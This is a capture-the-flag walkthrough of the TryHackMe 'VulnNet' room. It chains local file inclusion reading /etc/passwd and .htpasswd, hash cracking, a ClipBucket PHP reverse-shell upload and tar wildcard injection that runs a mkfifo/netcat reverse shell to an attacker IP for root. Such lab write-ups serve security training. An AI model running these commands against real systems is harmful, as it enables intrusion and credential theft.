---
description: https://tryhackme.com/room/vulnnet1
---

# VulnNet

## Nmap

```
sudo nmap 10.10.14.164 -p- -sS -sV                                

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### Web Server

Investigating port 80, we are welcomed over to the Vulnnet Entertainment landing page.

![](<../../../.gitbook/assets/image (2098).png>)

### Path Traversal

Starting enumeration with ZAP's active scan feature, we detect a high alert for a path traversal vulnerability.

```
http://vulnnet.thm/index.php?referer=/etc/passwd
```

![](<../../../.gitbook/assets/image (12) (4).png>)

Whilst the path traversal works, the results are not visible unless looking at the source of the `/index.php` page.

```
view-source:https://vulnnet.thm/index.php?referer=%2Fetc%2Fpasswd
```

![](<../../../.gitbook/assets/image (27).png>)

### Enumeration

From `/etc/passwd` we obtain the username server-management. For further information we use the path traversal vulnerability to acquire even further information about the `/index.php` page located in `/var/www/html/`.&#x20;

As per the image shown below, we can now see even further information and that the page is running ClipBucket version 4.0.

![](<../../../.gitbook/assets/image (4) (2) (2).png>)

A quick search with `searchsploit` reveals multiple vulnerabilities for version 4.0.0.

![](<../../../.gitbook/assets/image (5) (5).png>)

**Exploit-db:** [https://www.exploit-db.com/exploits/44250](https://www.exploit-db.com/exploits/44250)

However, I was unable to successfully complete any of the suggested exploits due inaccessible and required directories.

### Sub Domain Enumeration

Taking the enumeration further we start fuzzing for subdomains on http://vulnnet.thm.

```
wfuzz -c -f sub-fighter -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u "http://vulnnet.thm" -H "Host: FUZZ.vulnnet.thm" --hl 141
```

Looking at the results below we get the response code 401 (Unauthorized) for the sub domain http://broadcast.vulnnet.thm.&#x20;

![](<../../../.gitbook/assets/image (2091).png>)

Appending the braodcast sub domain to our `/etc/hosts` file we then browse to the new domain and are prompted for credentials.

![](<../../../.gitbook/assets/image (32).png>)

Brute forcing the login page with the server-management user and Hydra provided unsuccessful. Likewise, admin and root did not work either.&#x20;

Back to enumeration...

### Further Enumeration

Building on further from the LFI vulnerability discovered by ZAP earlier we start fuzzing for further files. We get a valid hit on `/etc/apache2`.

```
wfuzz -u "http://vulnnet.thm/index.php?referer=FUZZ" -w /usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt --hl 141 -R 2 
```

![](<../../../.gitbook/assets/image (2097).png>)

Fuzzing for further files within the `/etc/apache2` directory we soon get a hit for .`htapasswd`.

```
wfuzz -u "http://vulnnet.thm/index.php?referer=/etc/apache2/FUZZ" -w /usr/share/seclists/Discovery/Web-Content/raft-small-files-lowercase.txt --hl 141 -R 2 
```

![](<../../../.gitbook/assets/image (29).png>)

Using `curl` we read the contents of `.htpasswd` and discover credentials within the file.

```
curl  "http://vulnnet.thm/index.php?referer=/etc/apache2/.htpasswd"
```

![](<../../../.gitbook/assets/image (33).png>)

### Hashcat

Using hashcat against the rockyou.txt wordlist we are soon able to crack the Apache2 encrypted password.

```
 hashcat -a 0 -m 1600 hash /usr/share/wordlists/rockyou.txt
```

![](<../../../.gitbook/assets/image (19) (3) (1).png>)

### Accessing ClipBucket

Using the newley discovered credentials for the user developers on the `http://boradcast.vulnnet.thm` web page we are able to proceed and are greeted with the index page for Clipbucket.

![](<../../../.gitbook/assets/image (2085).png>)

### Arbitary File Upload / Shell

Going back to Exploit-DB we can begin again, to look at the various vulnerabilities. In this instance I have chosen to proceed with the Unauthenticated Arbitary File Upload.&#x20;

![](<../../../.gitbook/assets/image (2092).png>)

Using the PHP Monkey reverse shell generated from [RevShells](https://revshells.com/) I then used the command below to perform a file upload.

```
curl -F "file=@shell.php" -F "plupload=1" -F "name=anyname.php" "http://broadcast.vulnnet.thm/actions/beats_uploader.php" -u developers:<Password>
```

![](<../../../.gitbook/assets/image (6) (3).png>)

The response message includes the directory and name of the uploaded file. Using this information we start a netcat listener and browse to the uploaded reverse shell.

```
http://broadcast.vulnnet.thm/actions/CB_BEATS_UPLOAD_DIR/<FileName>.php
```

Gaining access as _www-data_.

![](<../../../.gitbook/assets/image (25) (1).png>)

From here we give ourselves a better shell experience.

```
/usr/bin/script -qc /bin/bash /dev/null
```

### Crontab

Performing basic enumeration steps on the target system we find the file `/var/opt/backupsrv.sh` is executed by **root** every two minutes.

![](<../../../.gitbook/assets/image (1) (2) (1).png>)

Viewing the contents of the file we see that all files within `/home/server-management/Documents` are archived using `tar` everytime the scipt is run.

```
#!/bin/bash

# Where to backup to.
dest="/var/backups"

# What to backup. 
cd /home/server-management/Documents
backup_files="*"

# Create archive filename.
day=$(date +%A)
hostname=$(hostname -s)
archive_file="$hostname-$day.tgz"

# Print start status message.
echo "Backing up $backup_files to $dest/$archive_file"
date
echo

# Backup the files using tar.
tar czf $dest/$archive_file $backup_files

# Print end status message.
echo
echo "Backup finished"
date

# Long listing of files in $dest to check file sizes.
ls -lh $dest
```

Reading the script we see that `tar` is backing up files and ending the command in a wildcard. I have previously document performing privilege escalation in the TryHackMeRoom Marketplace using `tar` wildcard injection

{% content-ref url="marketplace.md" %}
[marketplace.md](marketplace.md)
{% endcontent-ref %}

However, we have no permissions over the destination path of `/home/server-management/Documents`.

### Archive Exctration

Looking at the files already backed up and archived to `/var/opt/backups` we notice two archived files of interest;

Extract these to a writeable directory:

```
tar -xf ssh-backup.tar.gz -C /tmp/
tar -xf vulnnet-Monday.tgz -C /tmp/
```

Viewing the `id_rsa` is of interest.

![](<../../../.gitbook/assets/image (15) (1) (1).png>)

Transferring the `id_rsa` key over to my attacking system we are prompted for a password when trying to use it when connecting as the user _server-management_.

![](<../../../.gitbook/assets/image (7) (1) (1) (2).png>)

### Hashing and Cracking

Using ssh2john we can hash the key file and then, perform password cracking to reveal the plain text password.

```
/usr/bin/ssh2john id_rsa >> hash_id
```

![](<../../../.gitbook/assets/image (2099).png>)

### SSH as server-management

With the now discovered credentials we are able to login over `SSH` with the user _server-management_.

![](<../../../.gitbook/assets/image (2094).png>)

### Tar wildcard injection

Revisiting the `/var/opt/backupsrv.sh` file we should now be able to perform privilege escalation as `/home/server-management/Documents` is within our home directory.

![](<../../../.gitbook/assets/image (14) (2) (2).png>)

Referring again to the steps I performed for the Marketplace room. Ensuring we are running from the Documents folder.

```
echo "mkfifo /tmp/ydzhkhh; nc 10.11.54.237 8000 0</tmp/ydzhkhh | /bin/sh >/tmp/ydzhkhh 2>&1; rm /tmp/ydzhkhh"
echo "" > "--checkpoint-action=exec=sh shell.sh"
echo "" > --checkpoint=1
```

![](<../../../.gitbook/assets/image (2088).png>)

### Shell as root

Start a netcat listener, wait a couple of minutes and obtain a **root** shell and then grab the root.txt flag.

![](<../../../.gitbook/assets/image (22) (2).png>)
